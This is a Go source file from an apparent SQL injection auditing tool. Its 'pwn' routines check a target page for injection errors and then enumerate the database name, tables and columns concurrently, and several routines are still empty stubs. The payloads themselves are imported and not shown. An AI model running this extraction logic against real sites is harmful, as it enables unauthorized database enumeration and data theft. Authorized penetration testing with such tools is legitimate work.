package sql

import (
	"auditor/app"
	"auditor/core/context"
	"auditor/core/utils"
	"auditor/entities"
	"auditor/handlers/common"
	based "auditor/handlers/sql/base"
	errorBased "auditor/handlers/sql/base/error"
	"auditor/payloads/intruder/detect"
	"log"
	"strings"
	"sync"

	"github.com/fatih/color"
)

const (
	base = "/sql"
)

var (
	options *entities.DBOptions
	wg      = sync.WaitGroup{}
	m       = sync.RWMutex{}
)

// ServiceInterface service interface
type ServiceInterface interface {
	TestIntruder(c *context.Context, f *common.PageQuery) (interface{}, error)
	Init(c *context.Context, f *BaseForm) (interface{}, error)
	ErrorBased(c *context.Context, f *BaseForm) (interface{}, error)

	findPrevious(f *BaseForm) *entities.DBOptions
	fetchDBNameLength(method based.SQLi)
	fetchDBName(method based.SQLi)
	fetchDBTableCount(method based.SQLi)
	fetchDBTables(method based.SQLi, tableNo int)
}

// Service  repo
type Service struct {
	rp      RepoInterface
	context *app.Context
}

// NewService new service
func NewService(c *app.Context) ServiceInterface {
	return &Service{
		context: c,
		rp:      NewRepo(),
	}
}

func (s *Service) TestIntruder(c *context.Context, f *common.PageQuery) (interface{}, error) {
	// payloads := getDetectPayload(SQLIType(f.Type))
	// return payloads, nil
	return nil, nil
}

func (s *Service) Init(c *context.Context, f *BaseForm) (interface{}, error) {
	options = s.findPrevious(f)

	method := validatePwnType()

	switch method {
	case based.LengthValidation:
		log.Println("[+] Length Validation Detection Method: YES")
		s.pwnLengthValidation(based.LengthValidation)
	case based.UnionSQLiBased:
		log.Println("[+] UnionV alidation Detection Method: YES")
		s.pwnErrorbased()
	}

	return options, nil
}

func (s *Service) pwnLengthValidation(method based.SQLi) interface{} {
	color.Green("[*] RUNNING PWN ...")

	cleanHtml := utils.GetPageHTML(options.URL.String(), options.Cookie)
	for k, v := range detect.Payloads {
		if validateByMethod(v, method) == 1 {
			options.Payload = k

			for _, valueErr := range detect.ErrPayloads {
				if strings.ContainsAny(cleanHtml, valueErr) {
					log.Println("[INFO] PAYLOAD SUCCESSFUL")

					s.fetchDBNameLength(method)
					s.fetchDBName(method)
					s.fetchDBTableCount(method)

					for i := 0; i < options.TableCount; i++ {
						wg.Add(1)
						go func(index int) {
							s.fetchDBTables(method, index)
							wg.Done()
						}(i)
					}
					wg.Wait()

					for i := range options.Tables {
						wg.Add(1)
						go func(tableName string) {
							s.fetchColumnsName(method, tableName)
							// s.fetchDBRows(method, tableName)
							wg.Done()
						}(i)
					}
					wg.Wait()

					return nil
				}
			}
		}
	}
	return nil
}

func (s *Service) pwnErrorbased() (interface{}, error) {
	// dbLen := based.ExtractDatabaseLen(options)
	return nil, nil
}

// time.Now().Format("2006-01-02")
func (s *Service) ErrorBased(c *context.Context, f *BaseForm) (interface{}, error) {
	options = entities.URLOptions(f.URL, f.Param, f.Cookie)

	errorBased.ExtractDBName(options)
	errorBased.ExtractTables(options)
	errorBased.ExtractColumns(options)

	return options, nil
}
